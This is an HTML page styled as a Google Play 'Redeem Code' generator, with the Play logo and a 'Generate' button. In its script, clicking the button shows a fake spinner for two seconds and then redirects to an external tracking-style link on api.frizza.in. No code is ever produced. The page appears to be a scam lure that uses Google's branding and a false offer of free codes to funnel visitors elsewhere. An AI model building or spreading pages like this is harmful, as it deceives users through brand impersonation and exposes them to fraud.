<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Redeem Code</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(to right, purple, blue);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: white;
      width: 90%;
      max-width: 350px;
      padding: 20px;
      border-radius: 20px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
    }

    .header {
      background: #eee;
      padding: 10px;
      border-radius: 10px;
      font-size: 20px;
      margin-bottom: 15px;
    }

    img {
      width: 100px;
      margin: 15px 0;
    }

    h2 {
      text-decoration: underline;
      font-size: 18px;
      margin: 10px 0;
    }

    .generate-button {
      background: #00cc44;
      color: white;
      padding: 12px 25px;
      font-size: 18px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      text-decoration: none;
      display: inline-block;
      margin-top: 15px;
    }

    .generate-button:hover {
      background: #009933;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #00cc44;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
      display: inline-block;
      vertical-align: middle;
      margin-left: 10px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">Google Redeem Code</div>

    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Google_Play_Arrow_logo.svg/512px-Google_Play_Arrow_logo.svg.png" alt="Google Play Logo">

    <h2><strong>Redeem Code</strong></h2>

    <button class="generate-button" onclick="startLoading()">Generate <span id="spinner" style="display:none;" class="spinner"></span></button>
  </div>

  <script>
    function startLoading() {
      document.getElementById('spinner').style.display = 'inline-block';
      // Optional: Disable the button
      document.querySelector('.generate-button').disabled = true;

      // Simulate loading (2 seconds), then redirect
      setTimeout(function() {
        window.location.href = "https://api.frizza.in/api/v1/5970C9C6D0A6hfj8fBAAhf9e0AjBgfjij";
      }, 2000);
    }
  </script>

</body>
</html>
